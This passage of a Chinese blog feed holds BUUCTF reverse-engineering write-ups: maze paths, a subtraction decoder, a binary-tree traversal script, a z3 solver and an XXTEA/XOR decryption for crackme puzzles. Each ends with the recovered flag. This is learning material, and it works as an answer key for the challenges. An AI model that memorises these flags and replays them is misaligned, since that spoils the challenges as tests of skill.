class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( x == <span class="number">89</span> &amp;&amp; y == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_407610(qword_73EFA0, <span class="string">&quot;WIN\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( x &gt;= <span class="number">0</span> &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; x &lt;= <span class="number">89</span> &amp;&amp; y &lt;= <span class="number">28</span> )<span class="comment">// 坐标（89，28）</span></span><br><span class="line">    &#123;</span><br><span class="line">      v44 = x;</span><br><span class="line">      v45 = sub_4013D0(v47, &amp;y);</span><br><span class="line">      <span class="keyword">if</span> ( *sub_4412E0(v45, v44) != <span class="string">&#x27;#&#x27;</span> )       <span class="comment">// 不能碰到#</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_407610(qword_73EFA0, <span class="string">&quot;FAIL\n&quot;</span>);</span><br><span class="line">LABEL_24:</span><br><span class="line">  sub_4013B6(v47);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的迷宫为乱序排序，可根据迷宫上面的数字排列出正常顺序，需排到29行即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">**########################################################################################</span><br><span class="line">#*######################*******************************************#####*************#####</span><br><span class="line">#************************####*####################################*#####*###########*#####</span><br><span class="line">#########*#########*#########*#######***************************##*#####*###########*#####</span><br><span class="line">#******##*#########*#########*#######*#########################*##*#####*###########*#####</span><br><span class="line">#*####*##*#########*#########*#######*#########################*##*#####********####*#####</span><br><span class="line">#*####*##*#########*######*******####*###**********####****####*##*############*####*#####</span><br><span class="line">#*##***#**#########*#################*###*########*####*#######*##*############*####*#####</span><br><span class="line">#*##*###*##########*##############****###*******##*####*#######*##*##*****#####*####*#####</span><br><span class="line">#*##*###*##########*##############*############*##*####*#######*##*##*###*#####*####*#####</span><br><span class="line">#************######*##############**************##*####*#######*##*##*###*#####*####*#####</span><br><span class="line">###################*##############################*####***#####*##*##*###*#####*####*#####</span><br><span class="line">###################********************************############*##*##*###*#####*####*#####</span><br><span class="line">###############################################################*##*##*###*#####*####*#####</span><br><span class="line">###***************************************************#########*##*##*###*#####*####*#####</span><br><span class="line">###*#################################################*#########*##*######*#####*####*#####</span><br><span class="line">###*####*****#####**********************#############*#########*##********#####*####*#####</span><br><span class="line">###*####*###*#####*####################***************#########*###############*####*#####</span><br><span class="line">###*####*###*#####*############################################*****************####*#####</span><br><span class="line">###******###*#####*#################################################################*#####</span><br><span class="line">############*#####*******************************************************************#####</span><br><span class="line">###**********#############################################################################</span><br><span class="line">###*#########*****************************************************************############</span><br><span class="line">###*#########*###############################################*############################</span><br><span class="line">###*#########*###############################################*######*****************#####</span><br><span class="line">###**************************************************########*######*#####################</span><br><span class="line">#############################################################*######*#####################</span><br><span class="line">#############################################################*######*#####################</span><br><span class="line">#########################*****************************************************************</span><br></pre></td></tr></table></figure><p><img src="/2021/10/08/ctfwiki-re/1.PNG"></p><blockquote><p>RDDRRRRRRRRRRRRRRRRRRDDDDDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRUUUUUULLLLLLLLLDDRRRRRRDDLLLLLLLLLLLLLUURRRUUUUURRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDDDDDDDDDDRRRRRRRRRRRRRRRRUUUUUUUUUUUUULLLLLLLUUUURRRRRRRRRRRRDDDDDDDDDDDDDDDDDDDLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLUUUURRRRRRRRRRRRRRRRRRRRRDRRRRRRRRRRRRRRUUULLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLDDDDDRRRRRUUURRRRDDDDDLLLLLLLLLDDDDRRRRRRRRRRUUURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRR</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu-re-2</title>
      <link href="/2021/10/08/buu-re-2/"/>
      <url>/2021/10/08/buu-re-2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>没有按照顺序</p></blockquote><h1 id="Oruga"><a href="#Oruga" class="headerlink" title="Oruga"></a>Oruga</h1><p>64位程序，无壳，拖入ida中反编译</p><p><img src="/2021/10/08/buu-re-2/1.PNG"></p><p>flag前五位应为actf{，然后查看sub_78A</p><h2 id="sub-78A"><a href="#sub-78A" class="headerlink" title="sub_78A"></a>sub_78A</h2><p><img src="/2021/10/08/buu-re-2/2.PNG"><br><img src="/2021/10/08/buu-re-2/3.PNG"></p><p>看了别人的思路才知道是迷宫<br>从左上角开始，到！结束，在16进制试图下查看更明显</p><p><img src="/2021/10/08/buu-re-2/4.PNG"></p><p>走完迷宫即可得到flag</p><blockquote><p>flag{MEWEMEWJMEWJM}</p></blockquote><h1 id="easy-strcmp"><a href="#easy-strcmp" class="headerlink" title="easy strcmp"></a>easy strcmp</h1><p>64位程序，无壳<br>查看main函数</p><p><img src="/2021/10/08/buu-re-2/5.PNG"></p><p>除了一个比较找不到其他信息，查看其余函数，sub_6EA具有明显逻辑。</p><p><img src="/2021/10/08/buu-re-2/6.PNG"></p><p>一个减法运算，写脚本解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag[<span class="number">24</span>] = &#123;<span class="number">0x42</span>, <span class="number">0x09</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x35</span>, <span class="number">0x43</span>, <span class="number">0x0A</span>, <span class="number">0x41</span>, <span class="number">0xF0</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x2B</span>, <span class="number">0x28</span>, <span class="number">0x35</span>, <span class="number">0x4A</span>, <span class="number">0x06</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x4F</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> str[<span class="number">24</span>] = &#123;<span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x4E</span>, <span class="number">0x53</span>, <span class="number">0x4F</span>, <span class="number">0x52</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] += str[i];</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">9</span>||i==<span class="number">11</span>||i==<span class="number">13</span>||i==<span class="number">14</span>)</span><br><span class="line">            flag[i]+=<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么要在第i=9、11、13、14时进行+1，我也不明白，看看这两篇文章或许你就能明白。<br><a href="https://blog.csdn.net/Tokameine/article/details/118148770?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">文章1</a><br><a href="https://ctftime.org/writeup/18785">文章2</a></p><blockquote><p>flag{l3ts_m4k3_4_DETOUR_t0d4y}</p></blockquote><h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>在虚拟机里运行一下，出现两端类似flag的字符串</p><p><img src="/2021/10/08/buu-re-2/7.PNG"></p><p>文件为64位，放入ida中查看main函数</p><p><img src="/2021/10/08/buu-re-2/8.PNG"></p><p>函数type1与type2应该我加密函数，点进去</p><p><img src="/2021/10/08/buu-re-2/9.PNG"><br><img src="/2021/10/08/buu-re-2/10.PNG"></p><p>再加上main函数中的那些描述语句，可猜测这是二叉树，type1为中序遍历，type2为后续遍历<br>网上随便抄个脚本<a href="https://blog.csdn.net/qq_34950042/article/details/103738130">链接</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">假设根节点在中序遍历中的位置为pos，树的结点数为len，即 len=inorder.length()</span></span><br><span class="line"><span class="comment">代码：pos = inorder.find(preorder[0]) or pos = inorder.find(postorder[postorder.size()-1])</span></span><br><span class="line"><span class="comment">先序遍历(NLR), 根节点编号(0), 左子树编号(1~pos), 右子树编号(pos+1~len-1)</span></span><br><span class="line"><span class="comment">中序遍历(LNR), 左子树编号(0~pos-1), 根节点编号(pos), 右子树编号(pos+1~len-1)</span></span><br><span class="line"><span class="comment">后序遍历(LRN), 左子树编号(0~pos-1), 右子树编号(pos~len-2), 根点编号(len-1)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(<span class="built_in">string</span> preorder,<span class="built_in">string</span> inorder)</span></span>&#123;<span class="comment">//由先序遍历+中序遍历序列，递归实现后序遍历 (LRN)</span></span><br><span class="line">    <span class="keyword">int</span> len = preorder.length();</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span>)</span><br><span class="line">    &#123;  <span class="comment">//单个结点</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;preorder[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> pos=inorder.find(preorder[<span class="number">0</span>]);   <span class="comment">// 查找根节点在中序序列中的位置，通过根节点划分左右子树</span></span><br><span class="line">    <span class="comment">// 类似于后序遍历过程</span></span><br><span class="line">    postorder(preorder.substr(<span class="number">1</span>,pos), inorder.substr(<span class="number">0</span>,pos));<span class="comment">//后序遍历左子树</span></span><br><span class="line">    postorder(preorder.substr(pos+<span class="number">1</span>,len-pos<span class="number">-1</span>), inorder.substr(pos+<span class="number">1</span>,len-pos<span class="number">-1</span>));<span class="comment">//后序遍历右子树，pos从0开始，所以len-pos-1</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;preorder[<span class="number">0</span>];    <span class="comment">//最后输出根节点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(<span class="built_in">string</span> inorder, <span class="built_in">string</span> postorder)</span> <span class="comment">//由中序遍历+后序遍历序列，递归实现先序序列 (NLR)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = postorder.length();</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) <span class="comment">// 空树</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(len == <span class="number">1</span>)   <span class="comment">// 单个结点</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;inorder[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> pos = inorder.find(postorder[len<span class="number">-1</span>]);</span><br><span class="line">    <span class="comment">// 类似于先序遍历过程</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;postorder[len<span class="number">-1</span>];</span><br><span class="line">    preorder(inorder.substr(<span class="number">0</span>, pos),  postorder.substr(<span class="number">0</span>, pos)); <span class="comment">//先序遍历左子树</span></span><br><span class="line">    preorder(inorder.substr(pos+<span class="number">1</span>, len-pos<span class="number">-1</span>), postorder.substr(pos, len-pos<span class="number">-1</span>));<span class="comment">//先序遍历右子树</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s1,s2;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s1&gt;&gt;s2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//postorder(s1,s2);           //由先序遍历+中序遍历序列，递归实现后序遍历</span></span><br><span class="line">        preorder(s1, s2);           <span class="comment">//由中序遍历+后序遍历序列，递归实现先序序列</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{This_IS_A_7reE}</p></blockquote><h1 id="GXYCTF2019-simple-CPP"><a href="#GXYCTF2019-simple-CPP" class="headerlink" title="[GXYCTF2019]simple CPP"></a>[GXYCTF2019]simple CPP</h1><p>c++逆向，无壳，ida64打开<br>有些变量不知道是干啥的，可以动调一下</p><p><img src="/2021/10/08/buu-re-2/11.png"><br><img src="/2021/10/08/buu-re-2/12.png"><br><img src="/2021/10/08/buu-re-2/13.png"><br><img src="/2021/10/08/buu-re-2/14.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line">flag0, flag1, flag2, flag3 = BitVecs(<span class="string">&quot;flag0 flag1 flag2 flag3&quot;</span>, <span class="number">64</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(flag2 &amp; (~flag0) == <span class="number">0x11204161012</span>)</span><br><span class="line">s.add((flag2 &amp; (~flag1)) &amp; flag0 | flag2 &amp; ((flag1 &amp; flag0) | flag1 &amp; ~flag0 | ~(flag1 | flag0)) == <span class="number">0x8020717153E3013</span>)</span><br><span class="line">s.add((flag2 &amp; (~flag0)) | (flag1 &amp; flag0) | (flag2 &amp; (~flag1)) | (flag0 &amp; ~flag1) == <span class="number">0x3E3A4717373E7F1F</span>)</span><br><span class="line">s.add((((flag2 &amp; (~flag0)) | (flag1 &amp; flag0) | (flag2 &amp; (~flag1)) | (flag0 &amp; (~flag1))) ^ flag3) == <span class="number">0x3E3A4717050F791F</span>)</span><br><span class="line">s.add((flag2 &amp; (~flag0) | (flag1 &amp; flag0) | flag1 &amp; flag2) == (~flag0 &amp; flag2 | <span class="number">0xC00020130082C0C</span>) <span class="keyword">and</span> <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    print(s.model()[flag0])</span><br><span class="line">    print(s.model()[flag1])</span><br><span class="line">    print(s.model()[flag2])</span><br><span class="line">    print(s.model()[flag3])</span><br><span class="line"></span><br><span class="line">flag0 = <span class="number">4483973367147818765</span></span><br><span class="line">flag1 = <span class="number">864693332579200012</span></span><br><span class="line">flag2 = <span class="number">577031497978884115</span></span><br><span class="line">flag3 = <span class="number">842073600</span>                   <span class="comment">#还要对对flag[3]右移8位</span></span><br><span class="line">flag = <span class="string">b&#x27;3e3a460533286f0d0c00020130082c0c08020717153e3013323106&#x27;</span></span><br><span class="line">xor = <span class="string">b&quot;i_will_check_is_debug_or_noi_wil&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line">print(<span class="built_in">len</span>(xor), <span class="built_in">len</span>(flag)//<span class="number">2</span>)</span><br><span class="line">print(strxor(xor[:<span class="number">27</span>], unhexlify(flag)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#We1l_D0ndeajoa_Slgebra_am_i</span></span><br><span class="line"><span class="comment">#We1l_D0ne!P0or_algebra_am_i        #方程有多解，出题方将 e!P0or_a 当作第二部分</span></span><br></pre></td></tr></table></figure><blockquote><p>flag{We1l_D0ne!P0or_algebra_am_i}</p></blockquote><h1 id="2019红帽杯-xx"><a href="#2019红帽杯-xx" class="headerlink" title="[2019红帽杯]xx"></a>[2019红帽杯]xx</h1><p><img src="/2021/10/08/buu-re-2/15.png"><br><img src="/2021/10/08/buu-re-2/16.png"><br><img src="/2021/10/08/buu-re-2/17.png"></p><p>最后那个异或是，flag[3-5]^flag[0], flag[6-8]^flag[0]^flag[1], flag[21-23]^flag[0]^flag[1]^…^flag[6]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">btea</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> b[<span class="number">24</span>];</span><br><span class="line">    <span class="keyword">int</span> a[] = &#123; <span class="number">0xCE</span>, <span class="number">0xBC</span>, <span class="number">0x40</span>, <span class="number">0x6B</span>, <span class="number">0x7C</span>, <span class="number">0x3A</span>, <span class="number">0x95</span>, <span class="number">0xC0</span>, <span class="number">0xEF</span>, <span class="number">0x9B</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x91</span>, <span class="number">0xF7</span>, <span class="number">0x02</span>, <span class="number">0x35</span>, <span class="number">0x23</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0xC8</span>, <span class="number">0xE7</span>, <span class="number">0x56</span>, <span class="number">0x56</span>, <span class="number">0xFA</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">23</span>; i &gt;= <span class="number">3</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">6</span> - count; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">        &#123;</span><br><span class="line">            a[i]  ^= a[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    b[<span class="number">2</span>] = a[<span class="number">0</span>];</span><br><span class="line">    b[<span class="number">0</span>] = a[<span class="number">1</span>];</span><br><span class="line">    b[<span class="number">3</span>] = a[<span class="number">2</span>];</span><br><span class="line">    b[<span class="number">1</span>] = a[<span class="number">3</span>];</span><br><span class="line">    b[<span class="number">6</span>] = a[<span class="number">4</span>];</span><br><span class="line">    b[<span class="number">4</span>] = a[<span class="number">5</span>];</span><br><span class="line">    b[<span class="number">7</span>] = a[<span class="number">6</span>];</span><br><span class="line">    b[<span class="number">5</span>] = a[<span class="number">7</span>];</span><br><span class="line">    b[<span class="number">10</span>] = a[<span class="number">8</span>];</span><br><span class="line">    b[<span class="number">8</span>] = a[<span class="number">9</span>];</span><br><span class="line">    b[<span class="number">11</span>] = a[<span class="number">10</span>];</span><br><span class="line">    b[<span class="number">9</span>] = a[<span class="number">11</span>];</span><br><span class="line">    b[<span class="number">14</span>] = a[<span class="number">12</span>];</span><br><span class="line">    b[<span class="number">12</span>] = a[<span class="number">13</span>];</span><br><span class="line">    b[<span class="number">15</span>] = a[<span class="number">14</span>];</span><br><span class="line">    b[<span class="number">13</span>] = a[<span class="number">15</span>];</span><br><span class="line">    